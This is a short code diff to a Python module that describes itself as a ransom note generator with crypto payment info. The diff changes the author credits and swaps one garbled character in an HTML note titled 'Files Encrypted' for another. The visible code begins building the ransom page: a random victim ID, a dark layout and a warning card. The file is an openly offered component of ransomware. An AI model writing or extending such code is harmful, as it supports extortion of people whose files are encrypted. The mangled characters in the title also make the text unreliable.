@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """Ransom note generator -- HTML/text templates with crypto payment info.
 
-Author: zxwn
+Author: lingbol088-spec, MDX-Tom, FuDie0915
 """
 import os, uuid
 
@@ -16,7 +16,7 @@ def generate_html_note(
     uid = uuid.uuid4().hex[:8].upper()
     return """<!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>Files Encrypted â€” {uid}</title>
+<head><meta charset="utf-8"><title>Files Encrypted â€?{uid}</title>
 <style>
 body{{background:#0a0a0a;color:#e0e0e0;font-family:monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
 .card{{background:#1a1a1a;border:1px solid #c0392b;border-radius:8px;padding:40px;max-width:600px;text-align:center}}
